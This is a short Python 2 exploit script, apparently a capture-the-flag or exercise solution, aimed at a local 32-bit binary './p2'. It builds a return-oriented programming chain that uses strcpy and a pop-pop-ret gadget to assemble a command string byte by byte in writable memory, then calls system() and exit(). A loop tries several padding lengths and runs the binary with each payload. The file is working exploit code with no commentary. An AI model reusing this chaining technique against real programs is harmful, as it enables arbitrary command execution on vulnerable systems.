import os


strcpy='\xd0\x83\x04\x08'
poppopret='\x67\x86\x04\x08'
strloc1='\x11\x99\x04\x08'
characters=['\xc8\x86\x04\x08','\x74\x86\x04\x08','\x78\x86\x04\x08','\xb9\x86\x04\x08','\xc8\x86\x04\x08','\x74\x86\x04\x08','\xbc\x86\x04\x08','\x79\x86\x04\x08','\xca\x86\x04\x08','\xcb\x86\x04\x08']
payload = '\xd0\x83\x04\x08\x67\x86\x04\x08\x11\x99\x04\x08\x22\x87\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x12\x99\x04\x08\x23\x87\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x13\x99\x04\x08\x24\x87\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x14\x99\x04\x08\x25\x87\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x15\x99\x04\x08\x22\x87\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x16\x99\x04\x08\x23\x87\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x17\x99\x04\x08\x99\x86\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x18\x99\x04\x08\x9c\x86\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x19\x99\x04\x08\xab\x86\x04\x08\xd0\x83\x04\x08\x67\x86\x04\x08\x1a\x99\x04\x08\xfa\x86\x04\x08'
system = '\xf0\x83\x04\x08'
exit = '\x8e\x85\x04\x08'

for i in range(12):
    print i
    exploit = strcpy*i + payload + system + exit + strloc1
    print './p2 ' + exploit
    os.system('./p2 '+exploit)
